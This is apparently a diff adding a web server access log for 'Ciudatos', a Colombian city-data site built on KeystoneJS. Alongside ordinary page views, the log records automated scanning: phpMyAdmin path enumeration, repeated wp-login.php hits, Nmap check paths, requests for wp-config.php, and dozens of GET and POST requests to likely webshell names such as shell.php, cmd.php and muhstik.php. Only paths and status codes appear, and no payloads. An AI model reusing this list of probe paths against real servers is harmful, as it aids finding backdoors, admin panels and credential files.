+       md: 'La plataforma de datos de la Red de Ciudades Cómo Vamos tiene todos los datos recopilados desde el nacimiento de cada una de las 11 iniciativas. De acuerdo a la metodología utilizada por el programa, se recopilan dos tipos de datos:\r\n\r\nDatos Objetivos: Indicadores recopilados por ciudad, que describen el estado de las temáticas que dan cuenta de la calidad de vida en cada ciudad. Por ejemplo, la tasa de homicidios o de mortalidad en Medellín.\r\n\r\nDatos Subjetivos: Respuestas a las preguntas de la Encuesta de Percepción ciudadana aplicada anualmente en cada ciudad. La encuesta indaga sobre los temas que se incluyen en los indicadores objetivos, por ejemplo, sobre victimización, educación etc.' } } ]
+GET /about 200 85.696 ms
+GET /phpadmin/index.php 200 71.840 ms
+GET /phpmyadmin0/index.php 200 69.953 ms
+GET /phpmyadmin1/index.php 200 52.970 ms
+GET /phpmyadmin2/index.php 200 93.159 ms
+GET /myadmin/index.php 200 48.815 ms
+GET /myadmin2/index.php 200 77.808 ms
+GET /xampp/phpmyadmin/index.php 200 62.028 ms
+GET /phpMyadmin_bak/index.php 200 46.111 ms
+GET /www/phpMyAdmin/index.php 200 66.629 ms
+GET /tools/phpMyAdmin/index.php 200 58.016 ms
+GET /phpmyadmin-old/index.php 200 51.151 ms
+GET /phpMyAdminold/index.php 200 82.532 ms
+GET /phpMyAdmin.old/index.php 200 54.598 ms
+GET /pma-old/index.php 200 80.844 ms
+GET /claroline/phpMyAdmin/index.php 200 54.783 ms
+GET /typo3/phpmyadmin/index.php 200 80.189 ms
+GET /datos 200 58.743 ms
+GET /phpma/index.php 200 129.778 ms
+GET /phpmyadmin/phpmyadmin/index.php 200 93.362 ms
+GET /phpMyAdmin/phpMyAdmin/index.php 200 91.723 ms
+GET /ciudades 304 175.900 ms
+GET / 304 553.614 ms
+GET /visualizacion 200 177.520 ms
+GET /wp-login.php 200 200.439 ms
+GET / 200 379.974 ms
+GET / 200 288.352 ms
+GET /img/visualiza.png 200 146.720 ms
+GET /wp-login.php 200 116.912 ms
+GET / 200 227.137 ms
+GET /wp-login.php 200 249.656 ms
+GET / 200 504.850 ms
+GET /statics/cities/ibague.html 200 167.567 ms
+GET /wp-login.php 200 206.939 ms
+GET / 200 217.389 ms
+GET / 200 249.221 ms
+GET /wp-login.php 200 121.794 ms
+GET / 200 249.168 ms
+GET / 200 273.898 ms
+GET / 200 222.723 ms
+GET /nmaplowercheck1536362991 200 100.590 ms
+GET /NmapUpperCheck1536362991 200 147.228 ms
+GET /Nmap/folder/check1536362991 200 93.054 ms
+GET / 200 198.718 ms
+GET / 200 194.652 ms
+POST /sdk 200 58.934 ms
+GET /datos/indicadores/ 200 88.949 ms
+GET /ciudades/ciudatos/cities/nJbova__pbbNXHjB.html 200 121.622 ms
+GET /ciudades/ciudatos/cities/S9pIWcJSSoTdnz5A.html 200 103.058 ms
+GET /ciudades/ciudatos/cities/y7LPSl4l1lVv1KHB.html 200 76.809 ms
+GET /ciudades/ciudatos/cities/tJJaYiyarfdyvawM.html 200 62.578 ms
+GET /ciudades/ciudatos/cities/S9pIWcJSSoTdnz5A.html 200 247.676 ms
+GET /ciudades/ciudatos/cities/nJbova__pbbNXHjB.html 200 248.939 ms
+GET /ciudades/ciudatos/cities/6-KGkubaV6clsqMc.html 200 196.624 ms
+GET /wp-login.php 200 135.843 ms
+GET / 200 303.421 ms
+GET /wp-login.php 200 108.468 ms
+GET / 200 213.147 ms
+
+------------------------------------------------
+KeystoneJS Started:
+Ciudatos is ready on http://0.0.0.0:80
+------------------------------------------------
+
+GET /ods 304 692.278 ms
+GET / 200 528.201 ms
+GET / 304 465.032 ms
+GET / 200 356.394 ms
+GET /ods 304 110.321 ms
+GET /wp-login.php 200 135.856 ms
+GET / 200 281.930 ms
+GET /wp-login.php 200 159.776 ms
+GET / 200 194.623 ms
+GET / 200 214.369 ms
+GET / 200 192.392 ms
+GET /visualizacion 200 135.569 ms
+GET / 200 242.206 ms
+GET / 304 234.920 ms
+GET / 200 223.749 ms
+GET / 200 209.562 ms
+GET / 304 224.859 ms
+GET / 304 494.258 ms
+GET / 200 439.728 ms
+GET /wp-content/plugins/wpstorecart/php/upload.php 200 160.611 ms
+GET /ods 304 123.738 ms
+GET /ods 200 122.454 ms
+GET /ods 304 153.765 ms
+GET /ods 304 119.856 ms
+GET /wp-login.php 200 129.093 ms
+GET / 200 228.231 ms
+GET /wp-login.php 200 124.608 ms
+GET / 200 236.655 ms
+GET / 200 592.137 ms
+GET /wp-login.php 200 197.206 ms
+GET / 200 291.060 ms
+GET /wp-login.php 200 90.645 ms
+GET / 200 263.757 ms
+GET /ciudades/cartagena/ 200 179.461 ms
+GET /wp-login.php 200 156.869 ms
+GET / 200 254.272 ms
+GET / 304 273.381 ms
+GET / 200 248.888 ms
+GET / 304 227.341 ms
+GET /ods 304 115.205 ms
+GET /robots.txt 200 92.719 ms
+GET /ciudades/ciudatos/cities/nJbova__pbbNXHjB.html 200 90.006 ms
+GET /ciudades/ciudatos/cities/6-KGkubaV6clsqMc.html 200 107.245 ms
+GET /ciudades/ciudatos/cities/tJJaYiyarfdyvawM.html 200 97.739 ms
+GET /ciudades/ciudatos/cities/S9pIWcJSSoTdnz5A.html 200 115.893 ms
+
+------------------------------------------------
+KeystoneJS Started:
+Ciudatos is ready on http://0.0.0.0:80
+------------------------------------------------
+
+GET / 304 940.492 ms
+GET / 200 465.010 ms
+GET /apple-touch-icon-precomposed.png 200 142.488 ms
+GET /apple-touch-icon.png 200 255.885 ms
+GET / 200 216.856 ms
+GET /apple-touch-icon-precomposed.png 200 99.176 ms
+GET /apple-touch-icon.png 200 94.967 ms
+GET /robots.txt 200 97.775 ms
+GET / 200 207.917 ms
+GET / 304 558.969 ms
+GET /wp-login.php 200 210.143 ms
+GET / 200 348.705 ms
+GET / 304 255.068 ms
+GET /visualizacion 200 84.924 ms
+GET /ods 200 132.248 ms
+GET /wp-login.php 200 149.325 ms
+GET / 200 320.359 ms
+GET /wp-login.php 200 115.522 ms
+GET / 200 239.093 ms
+GET / 304 222.855 ms
+GET /ods 304 109.075 ms
+GET /ciudades 200 149.997 ms
+GET / 200 247.886 ms
+GET / 200 214.306 ms
+GET /ciudades 200 134.697 ms
+GET /ciudades 304 140.997 ms
+GET / 304 221.047 ms
+GET /visualizacion?section=buen_gobierno_y_ciudadania 200 90.543 ms
+GET / 304 197.510 ms
+GET /ciudades/cali 200 196.653 ms
+GET /wp-content/uploads/2016/02/ComousarAPI.pdf 200 139.280 ms
+PROPFIND / - - ms
+GET /webdav/ 200 224.634 ms
+GET /help.php 200 230.874 ms
+GET /java.php 200 131.794 ms
+GET /_query.php 200 131.542 ms
+GET /test.php 200 89.897 ms
+GET /db_cts.php 200 87.918 ms
+GET /db_pma.php 200 135.766 ms
+GET /logon.php 200 100.958 ms
+GET /help-e.php 200 86.607 ms
+GET /license.php 200 106.330 ms
+GET /log.php 200 82.691 ms
+GET /hell.php 200 118.997 ms
+GET /pmd_online.php 200 96.517 ms
+GET /x.php 200 117.781 ms
+GET /shell.php 200 100.789 ms
+GET /desktop.ini.php 200 105.074 ms
+GET /z.php 200 93.415 ms
+GET /lala.php 200 112.000 ms
+GET /lala-dpr.php 200 55.708 ms
+GET /wpo.php 200 120.572 ms
+GET /text.php 200 81.601 ms
+GET /wp-config.php 200 78.715 ms
+GET /muhstik.php 200 84.293 ms
+GET /muhstik2.php 200 62.453 ms
+GET /muhstiks.php 200 79.984 ms
+GET /muhstik-dpr.php 200 58.868 ms
+GET /lol.php 200 112.091 ms
+GET /uploader.php 200 83.981 ms
+GET /cmd.php 200 84.330 ms
+GET /cmx.php 200 60.313 ms
+GET /cmv.php 200 57.549 ms
+GET /cmdd.php 200 61.524 ms
+GET /knal.php 200 71.407 ms
+GET /cmd.php 200 67.651 ms
+GET /shell.php 200 71.663 ms
+GET /appserv.php 200 75.406 ms
+POST /wuwu11.php 200 106.254 ms
+POST /xw.php 200 58.901 ms
+POST /xw1.php 200 94.981 ms
+POST /9678.php 200 61.651 ms
+POST /wc.php 200 82.015 ms
+POST /xx.php 200 52.857 ms
+POST /s.php 200 168.074 ms
+POST /w.php 200 59.546 ms
+POST /sheep.php 200 54.377 ms
+POST /qaq.php 200 78.383 ms
+POST /db.init.php 200 75.594 ms
+POST /db_session.init.php 200 73.049 ms
+POST /db__.init.php 200 54.701 ms
+POST /wp-admins.php 200 69.082 ms
+POST /m.php?pbid=open 200 52.524 ms
+POST /db_dataml.php 200 80.330 ms
+POST /db_desql.php 200 69.759 ms
+POST /mx.php 200 61.512 ms
+POST /wshell.php 200 78.371 ms
+POST /xshell.php 200 67.887 ms
+POST /qq.php 200 45.997 ms
+POST /conflg.php 200 56.180 ms
+POST /lindex.php 200 51.785 ms
+POST /phpstudy.php 200 88.212 ms
+POST /phpStudy.php 200 77.129 ms
+POST /weixiao.php 200 82.173 ms
+POST /feixiang.php 200 55.852 ms
+POST /ak47.php 200 155.396 ms
+POST /ak48.php 200 59.758 ms
+POST /xiao.php 200 67.950 ms
+POST /yao.php 200 62.594 ms
+POST /defect.php 200 55.031 ms
+POST /webslee.php 200 91.475 ms
+POST /q.php 200 60.117 ms
+POST /pe.php 200 57.503 ms
+POST /hm.php 200 67.727 ms
+POST /cainiao.php 200 52.028 ms
+POST /zuoshou.php 200 51.421 ms
+POST /zuo.php 200 52.240 ms
+POST /aotu.php 200 62.147 ms
+POST /cmd.php 200 48.070 ms
+POST /bak.php 200 71.441 ms
+POST /system.php 200 51.645 ms
+POST /l6.php 200 62.065 ms
+POST /l7.php 200 76.949 ms
+POST /l8.php 200 79.383 ms
+POST /q.php 200 60.471 ms
+POST /56.php 200 55.836 ms
+POST /mz.php 200 63.516 ms
+POST /xx.php 200 49.648 ms
+POST /yumo.php 200 49.064 ms
+POST /min.php 200 60.790 ms
+POST /wan.php 200 62.658 ms
+POST /wanan.php 200 61.107 ms
+POST /ssaa.php 200 68.842 ms
+POST /qq.php 200 51.864 ms
+POST /aw.php 200 72.471 ms
+POST /12.php 200 52.672 ms
+POST /hh.php 200 60.388 ms
+POST /ak.php 200 51.585 ms
+POST /ip.php 200 73.549 ms
+POST /infoo.php 200 51.501 ms
+POST /qq.php 200 74.096 ms
+POST /qwe.php 200 43.317 ms
+POST /1213.php 200 82.303 ms
+POST /post.php 200 48.060 ms
+POST /h1.php 200 47.085 ms
+POST /test.php 200 51.254 ms
+POST /3.php 200 49.013 ms
+POST /phpinfi.php 200 56.845 ms
+POST /aaaa.php 200 47.712 ms
+POST /9510.php 200 87.280 ms
+POST /python.php 200 91.039 ms
+POST /default.php 200 55.413 ms
+POST /sean.php 200 62.393 ms
+POST /app.php 200 55.012 ms
+POST /help.php 200 80.286 ms
+POST /tiandi.php 200 44.626 ms
+POST /miao.php 200 74.569 ms
+POST /xz.php 200 57.336 ms
+POST /linuxse.php 200 48.838 ms
+POST /zuoindex.php 200 56.447 ms
+POST /zshmindex.php 200 54.389 ms
+POST /ceshi.php 200 63.153 ms
+POST /boots.php 200 56.644 ms
+POST /she.php 200 51.665 ms
+POST /s.php 200 51.850 ms
+POST /qw.php 200 74.686 ms
+POST /test.php 200 72.690 ms
+POST /caonma.php 200 77.465 ms
+POST /ss.php 200 48.439 ms
+POST /wcp.php 200 44.319 ms
+POST /xiaoma.php 200 50.886 ms
+POST /xiaomae.php 200 47.209 ms
+POST /xiaomar.php 200 77.453 ms
+POST /qq.php 200 69.627 ms
+POST /data.php 200 53.252 ms
+POST /log.php 200 71.000 ms
+POST /fack.php 200 62.062 ms
+POST /angge.php 200 56.552 ms
+GET /index.php 200 45.764 ms
+GET /phpmyadmin/index.php 200 65.852 ms
+GET /phpMyAdmin/index.php 200 55.326 ms
+GET /pmd/index.php 200 48.042 ms
+GET /pma/index.php 200 50.659 ms
+GET /PMA/index.php 200 70.759 ms
+GET /PMA2/index.php 200 57.121 ms
+GET /pmamy/index.php 200 49.851 ms
+GET /pmamy2/index.php 200 55.655 ms
+GET /mysql/index.php 200 56.170 ms
+GET /admin/index.php 200 67.826 ms
+GET /db/index.php 200 59.457 ms
+GET /dbadmin/index.php 200 47.256 ms
+GET /web/phpMyAdmin/index.php 200 43.132 ms
+GET /admin/pma/index.php 200 73.154 ms
+GET /admin/PMA/index.php 200 69.041 ms
+GET /admin/mysql/index.php 200 50.483 ms
+GET /admin/mysql2/index.php 200 51.923 ms
+GET /admin/phpmyadmin/index.php 200 48.921 ms
+GET /admin/phpMyAdmin/index.php 200 48.091 ms
+GET /admin/phpmyadmin2/index.php 200 50.800 ms
+GET /mysqladmin/index.php 200 47.367 ms
+GET /mysql-admin/index.php 200 47.033 ms
+GET /phpadmin/index.php 200 51.057 ms
+GET /phpmyadmin0/index.php 200 51.180 ms
+GET /phpmyadmin1/index.php 200 51.399 ms
+GET /phpmyadmin2/index.php 200 57.763 ms
+GET /myadmin/index.php 200 66.386 ms
+GET /myadmin2/index.php 200 50.861 ms
+GET /xampp/phpmyadmin/index.php 200 47.090 ms
+GET /phpMyadmin_bak/index.php 200 54.221 ms
+GET /www/phpMyAdmin/index.php 200 52.920 ms
+GET /tools/phpMyAdmin/index.php 200 51.503 ms
+GET /phpmyadmin-old/index.php 200 45.490 ms
+GET /phpMyAdminold/index.php 200 44.761 ms
+GET /phpMyAdmin.old/index.php 200 88.045 ms
+GET /pma-old/index.php 200 59.849 ms
+GET /claroline/phpMyAdmin/index.php 200 47.586 ms
+GET /typo3/phpmyadmin/index.php 200 48.957 ms
+GET /phpma/index.php 200 46.427 ms
+GET /phpmyadmin/phpmyadmin/index.php 200 56.457 ms
+GET /phpMyAdmin/phpMyAdmin/index.php 200 86.437 ms
